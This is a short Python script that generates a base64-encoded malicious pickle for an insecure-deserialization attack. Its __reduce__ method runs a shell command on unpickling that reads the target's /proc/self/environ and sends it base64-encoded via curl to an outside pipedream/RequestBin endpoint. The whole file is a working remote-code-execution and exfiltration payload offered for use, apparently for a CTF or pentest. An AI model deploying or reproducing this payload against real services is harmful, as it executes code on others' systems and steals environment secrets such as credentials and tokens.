import base64
import pickle

class rce():
    def __reduce__(self):
        return (eval, ("os.system('curl https://enbgdei302k4o.x.pipedream.net/ -d \"$(cat /proc/self/environ | base64)\"')",))
        # https://enbgdei302k4o.x.pipedream.net/ <- RequestBin.com

code = pickle.dumps(rce())
print(base64.b64encode(code))